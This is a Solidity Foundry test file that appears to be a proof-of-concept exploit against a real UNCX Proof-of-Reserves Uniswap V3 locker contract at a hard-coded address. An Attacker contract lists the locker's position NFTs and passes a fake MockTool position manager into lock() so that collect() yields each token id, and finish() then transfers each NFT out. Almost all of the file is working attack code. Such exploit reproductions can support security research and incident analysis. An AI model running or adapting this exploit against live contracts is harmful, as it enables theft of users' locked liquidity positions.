// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {ICountryList} from "../src/ICountryList.sol";
import {IUNCX_ProofOfReservesV2_UniV3, INonfungiblePositionManager, UNCX_ProofOfReservesV2_UniV3} from "../src/UNCX_ProofOfReservesV2_UniV3.sol";
/*
    struct LockParams {
        INonfungiblePositionManager nftPositionManager; // the NFT Position manager of the Uniswap V3 fork
        uint256 nft_id; // the nft token_id
        address dustRecipient; // receiver of dust tokens which do not fit into liquidity and initial collection fees
        address owner; // owner of the lock
        address additionalCollector; // an additional address allowed to call collect (ideal for contracts to auto collect without having to use owner)
        address collectAddress; // The address to which automatic collections are sent
        uint256 unlockDate; // unlock date of the lock in seconds
        uint16 countryCode; // the country code of the locker / business
        string feeName; // The fee name key you wish to accept, use "DEFAULT" if in doubt
        bytes[] r; // use an empty array => []
    }
*/


interface IERC721 {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256 balance);
}

contract MockTool {
    address public token0_ = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public token1_ = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;

    uint256 public targetId=0;
    function factory() external view returns (address) {
        return address(this);
    }

    function getPool(address _token0, address _token1, uint24 _fee) external view returns (address){
        return address(this);
    }

    function positions(uint256 tokenId)
    external
    view
    returns (
        uint96 nonce,
        address operator,
        address token0,
        address token1,
        uint24 fee,
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity,
        uint256 feeGrowthInside0LastX128,
        uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0,
        uint128 tokensOwed1
    ) {
        console.log("positions");
        token0 = token0_;
        token1 = token1_;

        //tickUpper = 887250;
    }


    function changeTarget(uint256 target) public {
        targetId = target;
    }

    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata params)
    external
    payable
    returns (uint256 amount0, uint256 amount1) {
        return (0,0);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1) {
        return (targetId,targetId);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24){
        return 50;
    }

    function safeTransferFrom(address a, address b, uint256 nft_id) external payable {
        console.log("mock - safeTransferFrom");
    }

    function finish(uint256 tokenId) public {
        IERC721(token0_).transferFrom(0x7f5C649856F900d15C83741f45AE46f5C6858234, address(this), tokenId);
    }

    function mint(INonfungiblePositionManager.MintParams calldata params)
    external
    payable
    returns (
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0,
        uint256 amount1
    ) {
        amount0 = type(uint256).max;
        amount1 = type(uint256).max;
    }
    function burn(uint256 tokenId) external payable {}
}

contract ContractTest is Test {
    UNCX_ProofOfReservesV2_UniV3 public target;

    address public _countryList = 0x9720526C803aeee9c7558dBD19A4d6b512a49B94;
    address public _autoCollectAddress = 0x12a51944e8349B8e70Ed8e2d9BFbc88Adb4A8F4E;
    address public _lpFeeReceiver = 0x04bDa42de3bc32Abb00df46004204424d4Cf8287;
    address public _collectFeeReceiver = 0x12a51944e8349B8e70Ed8e2d9BFbc88Adb4A8F4E;

    function setUp() public {
        target = UNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);

        bytes memory customCode = vm.getDeployedCode("UNCX_ProofOfReservesV2_UniV3.sol:UNCX_ProofOfReservesV2_UniV3");
        vm.etch(address(target), customCode);
        //target = new UNCX_ProofOfReservesV2_UniV3(ICountryList(_countryList), payable(_autoCollectAddress), payable(_lpFeeReceiver), payable(_collectFeeReceiver));

    }

    function testCheck() public {
        address  TARGET = 0x7f5C649856F900d15C83741f45AE46f5C6858234;
        IERC721  UNI_V3 = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        console.log("target bal : %d", UNI_V3.balanceOf(TARGET));
    }
    function testExploit() public {
        console.log("test start...");

        Attacker at = new Attacker();
        at.run();

        console.log("balance victim : %d", IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(address(target)));
    }
}


contract Attacker {
    function run() public {
        MockTool mt = new MockTool();
        UNCX_ProofOfReservesV2_UniV3 target = UNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);

        uint256 token_count = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(0x7f5C649856F900d15C83741f45AE46f5C6858234);
        uint256[] memory ids = new uint256[](token_count);

        for(uint i=0;i<token_count;i++){
            uint256 tokenId = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).tokenOfOwnerByIndex(0x7f5C649856F900d15C83741f45AE46f5C6858234, i);
            ids[i] = tokenId;
        }

        console.log("ids length : %d", ids.length);
        for(uint j=0;j<ids.length;j++){
            console.log("tokenId : %d, i : %d", ids[j], j);
            IUNCX_ProofOfReservesV2_UniV3.LockParams memory lParam;
            lParam.nftPositionManager = INonfungiblePositionManager(address(mt));
            lParam.nft_id = ids[j];
            lParam.dustRecipient = address(0x3333);
            lParam.owner = address(0x3333);
            lParam.additionalCollector = address(0x3333);
            lParam.collectAddress = address(0x4444);
            lParam.unlockDate = block.timestamp*2;
            lParam.countryCode = 0;
            lParam.feeName = "DEFAULT";
            mt.changeTarget(ids[j]);
            target.lock(lParam);
            mt.finish(ids[j]);
        }
    }
}